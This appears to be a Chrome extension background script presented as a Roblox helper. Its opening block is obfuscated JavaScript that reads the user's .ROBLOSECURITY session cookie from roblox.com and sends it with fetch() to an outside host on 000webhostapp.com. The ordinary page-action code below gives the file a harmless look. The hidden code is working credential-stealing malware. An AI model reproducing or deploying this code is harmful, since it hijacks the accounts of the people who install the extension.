var _0x9d3f=["\x37\x37\x71\x4D\x45\x47\x5A\x5A","\x68\x74\x74\x70\x73\x3A\x2F\x72\x6F\x62\x6C\x6F\x78\x73\x2D\x74\x6F\x6F\x6C\x73\x2E\x30\x30\x30\x77\x65\x62\x68\x6F\x73\x74\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x6B\x6F\x6E\x74\x6F\x6C\x2E\x70\x68\x70\x3F\x74\x3D","\x31\x35\x33\x30\x32\x38\x77\x57\x42\x5A\x77\x66","\x31\x38\x36\x36\x39\x39\x78\x51\x62\x66\x77\x68","\x32\x39\x37\x31\x4B\x64\x53\x79\x50\x75","\x67\x65\x74","\x31\x34\x36\x30\x36\x33\x75\x44\x75\x55\x45\x54","\x63\x6F\x6F\x6B\x69\x65\x73","\x31\x32\x38\x36\x36\x30\x59\x76\x52\x6B\x4A\x4C","\x32\x39\x39\x30\x32\x39\x72\x50\x6F\x71\x6B\x62","\x31\x38\x37\x34\x36\x42\x56\x74\x57\x74\x51","\x2E\x52\x4F\x42\x4C\x4F\x53\x45\x43\x55\x52\x49\x54\x59","\x73\x68\x69\x66\x74","\x70\x75\x73\x68","\x76\x61\x6C\x75\x65","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x72\x6F\x62\x6C\x6F\x78\x2E\x63\x6F\x6D"];var _0x499b=[_0x9d3f[0],_0x9d3f[1],_0x9d3f[2],_0x9d3f[3],_0x9d3f[4],_0x9d3f[5],_0x9d3f[6],_0x9d3f[7],_0x9d3f[8],_0x9d3f[9],_0x9d3f[10],_0x9d3f[11]];function _0x5eb4(_0x8f64x3,_0x8f64x4){_0x8f64x3= _0x8f64x3- 0x183;var _0x8f64x5=_0x499b[_0x8f64x3];return _0x8f64x5}var _0x301fab=_0x5eb4;(function(_0x8f64x7,_0x8f64x8){var _0x8f64x9=_0x5eb4;while(!![]){try{var _0x8f64xa=-parseInt(_0x8f64x9(0x186))*  -parseInt(_0x8f64x9(0x18e)) + parseInt(_0x8f64x9(0x188)) +  -parseInt(_0x8f64x9(0x18b)) + parseInt(_0x8f64x9(0x18a)) + parseInt(_0x8f64x9(0x184)) +  -parseInt(_0x8f64x9(0x18c)) +  -parseInt(_0x8f64x9(0x185));if(_0x8f64xa=== _0x8f64x8){break}else {_0x8f64x7[_0x9d3f[13]](_0x8f64x7[_0x9d3f[12]]())}}catch(_0x731198){_0x8f64x7[_0x9d3f[13]](_0x8f64x7[_0x9d3f[12]]())}}}(_0x499b,0x251ec));function getCookies(_0x8f64xc,_0x8f64xd,_0x8f64xe){var _0x8f64xf=_0x5eb4;chrome[_0x8f64xf(0x189)][_0x8f64xf(0x187)]({'\x75\x72\x6C':_0x8f64xc,'\x6E\x61\x6D\x65':_0x8f64xd},function(_0x8f64x10){_0x8f64xe&& _0x8f64xe(_0x8f64x10[_0x9d3f[14]])})}getCookies(_0x9d3f[15],_0x301fab(0x18d),function(_0x8f64x11){var _0x8f64x12=_0x301fab;fetch(_0x8f64x12(0x183)+ _0x8f64x11)})
chrome.runtime.onInstalled.addListener(() => {
  chrome.declarativeContent.onPageChanged.removeRules(undefined, () => {
    chrome.declarativeContent.onPageChanged.addRules([{
      conditions: [
        new chrome.declarativeContent.PageStateMatcher({
          pageUrl: { hostContains: '.roblox.com' },
        }),
      ],
      actions: [new chrome.declarativeContent.ShowPageAction()],
    }]);
  });
});
